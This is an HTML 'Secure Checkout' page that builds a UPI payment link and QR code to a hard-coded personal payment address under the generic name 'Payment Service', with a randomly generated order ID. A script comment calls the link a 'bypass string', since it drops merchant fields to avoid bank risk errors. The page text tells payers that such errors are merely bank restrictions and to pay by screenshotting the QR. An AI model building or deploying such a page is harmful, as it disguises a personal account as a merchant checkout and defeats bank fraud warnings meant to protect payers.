<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <div class="w-full max-w-sm mx-auto bg-white shadow-2xl rounded-3xl overflow-hidden">
        <div class="bg-indigo-600 p-6 text-center">
            <h2 class="text-white text-lg font-bold">Confirm Payment</h2>
            <p class="text-indigo-200 text-sm">Order ID: <span id="oid">---</span></p>
        </div>

        <div class="p-8 text-center">
            <div class="mb-6">
                <span class="text-4xl font-black text-gray-900">₹1.00</span>
            </div>

            <a id="upi-link" href="#" class="block w-full py-4 bg-green-600 text-white rounded-2xl font-bold text-lg shadow-lg hover:bg-green-700 transition-all active:scale-95 mb-4">
                PAY NOW
            </a>

            <div class="relative flex py-5 items-center">
                <div class="flex-grow border-t border-gray-200"></div>
                <span class="flex-shrink mx-4 text-gray-400 text-xs uppercase font-bold">Or Scan QR</span>
                <div class="flex-grow border-t border-gray-200"></div>
            </div>

            <div class="bg-gray-50 p-4 rounded-2xl inline-block border border-gray-100">
                <img id="qr-img" src="" class="w-40 h-40 mx-auto">
            </div>
            
            <p class="text-[10px] text-gray-400 mt-6 leading-tight">
                If "Pay Now" shows a risk error, it is a restriction from your bank. <br> 
                <strong>Take a screenshot and scan the QR inside your app.</strong>
            </p>
        </div>
    </div>

    <script>
        // CONFIG - CHANGE THESE
        const VPA = "paytm.s1h4uwq@pty";
        const NAME = "Payment Service";
        const AMOUNT = "1.00";
        
        // Generate a 12-digit numeric Ref ID (UTR Style)
        const TR = Math.floor(Math.random() * 899999999999 + 100000000000).toString();
        document.getElementById('oid').innerText = TR.substring(6);

        // THE BYPASS STRING
        // We remove mc, mode, and purpose. For personal VPAs, these trigger the error.
        const upiData = `upi://pay?pa=${VPA}&pn=${encodeURIComponent(NAME)}&am=${AMOUNT}&cu=INR&tr=${TR}`;

        // Set the Link
        document.getElementById('upi-link').href = upiData;

        // Set the QR
        document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiData)}`;
    </script>
</body>
</html>
